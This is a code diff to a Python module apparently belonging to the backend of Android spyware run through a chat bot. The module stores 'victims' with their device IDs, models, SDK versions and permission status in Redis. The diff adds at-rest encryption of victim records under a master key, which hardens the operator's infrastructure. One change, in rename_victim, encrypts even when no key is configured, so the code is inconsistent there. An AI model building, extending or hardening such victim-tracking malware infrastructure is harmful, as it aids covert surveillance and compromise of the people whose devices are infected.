@@ -11,16 +11,44 @@ import secrets
 
 from logging_config import get_logger
 from monitoring import metrics
+from crypto_utils import encrypt_data, decrypt_data
 
 logger = get_logger("victims_manager")
 
 # ★★★ استخدام Redis من config فقط ★★★
 try:
-    from config import redis_client, REDIS_URL
+    from config import redis_client, REDIS_URL, MASTER_CRYPTO_KEY
     logger.info("Victims Manager: Using shared Redis")
 except Exception as e:
     logger.error(f"Victims Manager: config failed - {e}")
     redis_client = None
+    MASTER_CRYPTO_KEY = None
+
+
+# ============================================================
+# Encryption Helpers
+# ============================================================
+def _encrypt_victim_fields(data):
+    """تشفير حقول الضحية الحساسة"""
+    if not MASTER_CRYPTO_KEY:
+        return data
+    
+    fields_to_encrypt = ["name", "device_id", "model", "brand", "android", "sdk"]
+    for field in fields_to_encrypt:
+        if field in data and data[field]:
+            data[field] = encrypt_data(data[field], MASTER_CRYPTO_KEY)
+    return data
+
+def _decrypt_victim_fields(data):
+    """فك تشفير حقول الضحية"""
+    if not data or not MASTER_CRYPTO_KEY:
+        return data
+    
+    fields_to_encrypt = ["name", "device_id", "model", "brand", "android", "sdk"]
+    for field in fields_to_encrypt:
+        if field in data and data[field]:
+            data[field] = decrypt_data(data[field], MASTER_CRYPTO_KEY)
+    return data
 
 
 # ============================================================
@@ -74,9 +102,12 @@ def create_victim(chat_id, name, site="general"):
             "permissions_status": "unknown",
         }
 
+        # تشفير البيانات قبل الحفظ
+        storage_data = _encrypt_victim_fields(victim_data.copy())
+
         # ★ pipeline لتقليل العمليات
         pipe = redis_client.pipeline()
-        pipe.hset(_victim_hash(chat_id, victim_id), mapping=victim_data)
+        pipe.hset(_victim_hash(chat_id, victim_id), mapping=storage_data)
         pipe.expire(_victim_hash(chat_id, victim_id), 86400 * 30)
         pipe.sadd(_victims_set(chat_id), victim_id)
         pipe.expire(_victims_set(chat_id), 86400 * 30)
@@ -103,7 +134,9 @@ def get_victim(chat_id, victim_id):
         return None
     try:
         data = redis_client.hgetall(_victim_hash(chat_id, victim_id))
-        return data if data else None
+        if not data:
+            return None
+        return _decrypt_victim_fields(data)
     except Exception as e:
         logger.warning(f"get_victim error: {e}")
         return None
@@ -127,7 +160,7 @@ def get_all_victims(chat_id):
 
         for v in results:
             if v:
-                victims.append(v)
+                victims.append(_decrypt_victim_fields(v))
 
         victims.sort(
             key=lambda x: float(x.get("last_seen") or x.get("created_at") or 0),
@@ -192,7 +225,9 @@ def register_victim_device(chat_id, victim_id, device_id, info=None):
             if info.get("sdk"):
                 updates["sdk"] = str(info["sdk"])
 
-        redis_client.hset(_victim_hash(chat_id, victim_id), mapping=updates)
+        # تشفير التحديثات
+        storage_updates = _encrypt_victim_fields(updates.copy())
+        redis_client.hset(_victim_hash(chat_id, victim_id), mapping=storage_updates)
         metrics.inc_counter("victims_registered")
         return True
 
@@ -308,10 +343,11 @@ def rename_victim(chat_id, victim_id, new_name):
         return False
 
     try:
+        encrypted_name = encrypt_data(new_name[:40], MASTER_CRYPTO_KEY)
         redis_client.hset(
             _victim_hash(chat_id, victim_id),
             "name",
-            new_name[:40]
+            encrypted_name
         )
         return True
     except Exception as e:
